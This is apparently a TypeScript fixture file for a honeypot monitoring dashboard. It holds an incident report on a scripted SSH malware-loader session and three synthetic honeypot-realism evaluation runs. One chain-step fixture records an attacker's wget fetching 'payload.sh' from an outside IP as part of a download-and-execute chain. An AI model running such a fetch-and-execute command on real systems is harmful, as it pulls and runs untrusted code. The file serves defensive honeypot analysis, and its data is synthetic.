    id: "RPT-0041",
    title: "Automated Linux Malware Deployment — SESSION-8F42A1",
    sessionId: "SESSION-8F42A1",
    createdAt: at("14:40:00"),
    generatedBy: "gemma3:12b via FastAPI",
    executiveSummary:
      "A scripted intrusion against Cowrie-SSH-01 authenticated as root, fingerprinted the host, enumerated local accounts and retrieved a second-stage shell script from 31.44.185.9 before executing it. Behaviour is consistent with commodity Linux botnet recruitment. Containment priority: block the source IP and analyse the retrieved payload.",
    incidentOverview: {
      attackerIp: "185.207.104.42",
      target: "Cowrie-SSH-01 (10.20.4.11:22)",
      timeRange: "2026-08-27 14:31:02 → 14:32:10 UTC",
      protocol: "SSH",
      risk: "high",
      riskScore: 87,
    },
    timeline: sessionTimelines["SESSION-8F42A1"]!,
    attackerBehavior: {
      classification: "Automated Linux Malware Deployment",
      explanation:
        "Uniform inter-command delays and zero input corrections indicate a non-interactive script. The sequence discovery → download → chmod → execute matches known Mirai-derivative loader behaviour.",
      confidence: 0.94,
    },
    mitre: analysisFor8F42A1.techniques,
    indicators: indicators.filter((i) => i.sessionIds.includes("SESSION-8F42A1")),
    threatAssessment: {
      level: "high",
      confidence: 0.94,
      narrative:
        "High confidence of successful stage-2 delivery within a contained honeypot. No production asset exposure identified; the source infrastructure remains active and is likely to retarget.",
    },
    recommendedActions: analysisFor8F42A1.recommendedActions,
  },
];

/**
 * EVALUATION FIXTURES — synthetic honeypot-realism runs.
 *
 * These exist to exercise the shapes the UI must survive, not to flatter it:
 *
 *  * `evaluationRunB` has evaluatorStatus "unavailable", evaluatorModel null
 *    and EVERY evaluatorRating null. Nothing may render those as 0.0 — a null
 *    is a gap in what we could measure, not a verdict against the honeypot.
 *  * `evaluationRunC` is status "failed" while every module is "completed":
 *    OUR orchestration failed after the modules measured what they measured.
 *    It must not be relabelled as a honeypot failure.
 *  * `evaluationRunA` carries a null deterministicScore on `context` and omits
 *    `attack_possibilities` entirely (that run replayed no chains) — an absent
 *    characteristic and a null one are different things.
 *
 * deterministicScore and evaluatorRating are never combined anywhere here.
 *
 * Three values are copied from what the backend actually writes, because a
 * fixture that disagrees with the wire teaches the UI the wrong shape:
 *
 *  * `agentModel` is "deterministic-probes@<probe set version>", NOT a model
 *    name. `agent.run_probes` is paramiko plus a fixed probe list, so no model
 *    drives it; naming one would make a reader attribute a run-to-run
 *    difference to a model change that never happened.
 *  * `evaluatorModel` is a cloud BYOK model. The evaluator NEVER falls back to
 *    the local 8b model — the paper measured sub-70b models as returning only
 *    superficial critique in this role, so no key means evaluatorStatus
 *    "unavailable" (see `evaluationRunB`), never a local substitute.
 *  * Both fingerprints are "sha256:" + 64 hex characters. They are opaque and
 *    long; truncate them for display, never assume a readable tag.
 */
const evaluationRunA: EvaluationRun = {
  id: "8f3c1d20-4a55-4f18-9b2e-6c1a77d90a11",
  honeypotId: "hp-cowrie-ssh-01",
  status: "completed",
  startedAt: at("09:12:04"),
  finishedAt: at("09:18:41"),
  agentModel: "deterministic-probes@1",
  evaluatorModel: "claude-sonnet-4-5",
  evaluatorStatus: "completed",
  honeypotFingerprint: "sha256:58d862545e83275f6f0341e2b7c94a0d1f6e8b3947ac0d5e21bb7f4c9a63d810",
  evaluationConfigFingerprint:
    "sha256:9de2ea3012e212895723505d80abf17ee1b4e8847ae41230c2d4f7ca1628c0c0",
  // `attack_possibilities` is absent, not null: this run replayed no chains.
  categoryScores: [
    { characteristic: "basic_commands", deterministicScore: 0.86, evaluatorRating: 0.72 },
    { characteristic: "file_system", deterministicScore: 0.64, evaluatorRating: 0.55 },
    { characteristic: "services", deterministicScore: 0.41, evaluatorRating: 0.38 },
    { characteristic: "sanity", deterministicScore: 0.78, evaluatorRating: 0.81 },
    // Nothing was established for `context`: null, never 0.
    { characteristic: "context", deterministicScore: null, evaluatorRating: 0.44 },
  ],
  modules: [
    { module: "static_nmap", moduleStatus: "completed", detail: null },
    { module: "shell_probes", moduleStatus: "completed", detail: null },
    {
      module: "attack_chains",
      moduleStatus: "skipped",
      detail: "no chain matched the honeypot profile",
    },
  ],
  findings: [
    {
      id: "9d2f6b41-77aa-4c19-8f30-2b5e91d0c344",
      characteristic: "services",
      severity: "high",
      finding:
        "The SSH banner advertises OpenSSH 6.0p1 while the shell reports Debian 12, a pairing that shipped together on no real distribution.",
      recommendation: "Align the advertised banner with the emulated distribution release.",
      source: "deterministic",
      evidence: [
        {
          kind: "probe",
          esEventId: null,
          chainStepId: null,
          probeResultId: "aa11bb22-cc33-4d44-9e55-ff6677889900",
        },
      ],
    },
    {
      id: "3c8e0a17-19bd-4f52-b6c7-84a2d5e61b9f",
      characteristic: "file_system",
      severity: "medium",
      finding:
        "/var/log contains only files with identical modification timestamps, which reads as a freshly provisioned image rather than a host in service.",
      recommendation: "Age the log tree so timestamps spread across the claimed uptime.",
      source: "evaluator",
      evidence: [
        {
          kind: "probe",
          esEventId: null,
          chainStepId: null,
          probeResultId: "bb22cc33-dd44-4e55-af66-001122334455",
        },
      ],
    },
  ],
  chainSteps: [],
  probeResults: [
    {
      id: "aa11bb22-cc33-4d44-9e55-ff6677889900",
      module: "static_nmap",
      probeId: "ssh-banner",
      target: "22/tcp",
      establishes: "ssh.banner",
      value: "SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2",
      factStatus: "observed",
    },
    {
      id: "bb22cc33-dd44-4e55-af66-001122334455",
      module: "shell_probes",
      probeId: "var-log-listing",
      target: "/var/log",
      establishes: "fs.log_mtimes",
      value: "12 entries, all mtime 2026-08-01T00:00:00Z",
      factStatus: "observed",
    },
    {
      id: "cc33dd44-ee55-4f66-b077-112233445566",
      module: "shell_probes",
      probeId: "dmesg-ring",
      target: "dmesg",
      // Nothing established: establishes/value stay null and the fact is
      // `unknown`, which scoring excludes rather than counting against.
      establishes: null,
      value: null,
      factStatus: "unknown",
    },
  ],
};

/**
 * The null path the UI must not render as 0: the evaluator never ran, so there
 * is no rating for any characteristic and no evaluator model to name.
 */
const evaluationRunB: EvaluationRun = {
  id: "1b7e4a09-5d31-42c6-8a10-c9f2b40e5d77",
  honeypotId: "hp-cowrie-ssh-01",
  status: "completed",
  startedAt: at("11:44:19"),
  finishedAt: at("11:49:02"),
  agentModel: "deterministic-probes@1",
  evaluatorModel: null,
  evaluatorStatus: "unavailable",
  honeypotFingerprint: "sha256:7f1c93aa20e6b845d3097fe1c4b28d6a5e0f83719cd2a6b40e8f57193ac4b2de",
  evaluationConfigFingerprint:
    "sha256:9de2ea3012e212895723505d80abf17ee1b4e8847ae41230c2d4f7ca1628c0c0",
  categoryScores: [
    { characteristic: "basic_commands", deterministicScore: 0.91, evaluatorRating: null },
    { characteristic: "file_system", deterministicScore: 0.7, evaluatorRating: null },
    { characteristic: "services", deterministicScore: 0.52, evaluatorRating: null },
    { characteristic: "attack_possibilities", deterministicScore: 0.33, evaluatorRating: null },
    { characteristic: "sanity", deterministicScore: 0.8, evaluatorRating: null },
    { characteristic: "context", deterministicScore: null, evaluatorRating: null },
  ],
  modules: [
    { module: "static_nmap", moduleStatus: "completed", detail: null },
    { module: "shell_probes", moduleStatus: "timeout", detail: "budget reached after 41 probes" },
    { module: "attack_chains", moduleStatus: "completed", detail: null },
  ],
  // No evaluator means no evaluator findings; only the deterministic one.
  findings: [
    {
      id: "6f1a83c5-40de-4b27-9c88-7e05a3b19d62",
      characteristic: "attack_possibilities",
      severity: "high",
      finding:
        "wget reported a successful download but the retrieved file never appeared on disk, contradicting the shell's own success message.",
      recommendation: "Persist downloaded artifacts so the filesystem agrees with command output.",
      source: "deterministic",
      evidence: [
        {
          kind: "chain_step",
          esEventId: null,
          // The backend's ChainStepOut carries no id, so a chain-step citation
          // has nothing in `chainSteps` to resolve against. Shown as it is.
          chainStepId: "7a90b2c1-3de4-4f56-8901-a2b3c4d5e6f7",
          probeResultId: null,
        },
      ],
    },
  ],
  // `cowrieEventId` must be an id `getEvent` can actually resolve, or the demo
  // cannot exercise the one thing the evidence model exists for. Demo events are
  // `${sessionId}-ev-${index}`; index 7 of SESSION-8F42A1 is the wget below.
  chainSteps: [
    {
      id: "c1a2b3c4-d5e6-4f70-8a91-b2c3d4e5f601",
      chainId: "download-and-execute",
      stepIndex: 0,
      command: "wget http://31.44.185.9/payload.sh",
      cowrieEventId: "SESSION-8F42A1-ev-7",
      matchedRuleId: "rule-ingress-tool-transfer",
      expectedTechniqueId: "T1105",
      factStatus: "observed",
    },
    {
      // The step never ran, so there is no event to cite — a null pointer here
      // is honest, unlike an id that resolves to nothing.
      id: "c1a2b3c4-d5e6-4f70-8a91-b2c3d4e5f602",
      chainId: "download-and-execute",
      stepIndex: 1,
      command: "ls -l payload.sh",
      cowrieEventId: null,
      matchedRuleId: null,
      expectedTechniqueId: "T1105",
      factStatus: "not_observed",
    },
  ],
  probeResults: [
    {
      id: "dd44ee55-ff66-4077-8188-223344556677",
      module: "static_nmap",
      probeId: "ssh-banner",
      target: "22/tcp",
      establishes: "ssh.banner",
      value: "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3",
      factStatus: "observed",
    },
  ],
};

/**
 * status "failed" with every module "completed" — a real state. The modules
 * measured what they measured; our own orchestration is what failed.
 */
const evaluationRunC: EvaluationRun = {
  id: "c40a9e63-2f88-4b71-a3d5-0e6b18f42c05",
  honeypotId: "hp-ubuntu-web-01",
  status: "failed",
  startedAt: at("13:02:55"),
  finishedAt: at("13:07:12"),
  agentModel: "deterministic-probes@1",
  evaluatorModel: "claude-sonnet-4-5",
  evaluatorStatus: "evaluator_failed",
  honeypotFingerprint: "sha256:7f1c93aa20e6b845d3097fe1c4b28d6a5e0f83719cd2a6b40e8f57193ac4b2de",
  evaluationConfigFingerprint:
    "sha256:9de2ea3012e212895723505d80abf17ee1b4e8847ae41230c2d4f7ca1628c0c0",
  categoryScores: [
    { characteristic: "basic_commands", deterministicScore: 0.88, evaluatorRating: null },
    { characteristic: "services", deterministicScore: 0.49, evaluatorRating: null },
  ],
  modules: [
    { module: "static_nmap", moduleStatus: "completed", detail: null },
    { module: "shell_probes", moduleStatus: "completed", detail: null },
    { module: "attack_chains", moduleStatus: "completed", detail: null },
  ],
  findings: [],
  chainSteps: [],
  probeResults: [],
};

export const evaluationRuns: EvaluationRun[] = [evaluationRunA, evaluationRunB, evaluationRunC];

const toEvaluationSummary = (run: EvaluationRun): EvaluationRunSummary => ({
  id: run.id,
  honeypotId: run.honeypotId,
  status: run.status,
  startedAt: run.startedAt,
  finishedAt: run.finishedAt,
  agentModel: run.agentModel,
  evaluatorModel: run.evaluatorModel,
  evaluatorStatus: run.evaluatorStatus,
  honeypotFingerprint: run.honeypotFingerprint,
  evaluationConfigFingerprint: run.evaluationConfigFingerprint,
  categoryScores: run.categoryScores,
});

/** Newest first, matching the backend's ordering. */
export const evaluationRunSummaries: EvaluationRunSummary[] = [
  toEvaluationSummary(evaluationRunC),
  toEvaluationSummary(evaluationRunB),
  toEvaluationSummary(evaluationRunA),
];

/**
 * Build a comparison the way the backend does, so the demo shows the same
 * ambiguity a real one has: a null delta is either "not established on one
 * side" or "not measured in this run", and this payload cannot tell them apart.
 */
export function compareEvaluationRuns(base: EvaluationRun, head: EvaluationRun): RunComparison {
  const differences: string[] = [];
  if (base.honeypotFingerprint !== head.honeypotFingerprint) {
    // snake_case: these are VALUES in a string list, which CamelModel does not
    // alias -- the backend appends exactly these (runs.py).
    differences.push("honeypot_fingerprint");
  }
  if (base.evaluationConfigFingerprint !== head.evaluationConfigFingerprint) {
    differences.push("evaluation_config_fingerprint");
  }
  const deltas: Record<string, number | null> = {};
  const characteristics = new Set([
    ...base.categoryScores.map((score) => score.characteristic),
    ...head.categoryScores.map((score) => score.characteristic),
  ]);
  for (const characteristic of characteristics) {
    const from = base.categoryScores.find((score) => score.characteristic === characteristic);
    const to = head.categoryScores.find((score) => score.characteristic === characteristic);
    // A delta against "not established" is not a delta. Null, never 0.
    deltas[characteristic] =
      from?.deterministicScore == null || to?.deterministicScore == null
        ? null
        : to.deterministicScore - from.deterministicScore;
  }
  return {
    base,
    head,
    classification: differences.length === 0 ? "same_configuration" : "configuration_changed",
    differences,
    deltas,
  };
}
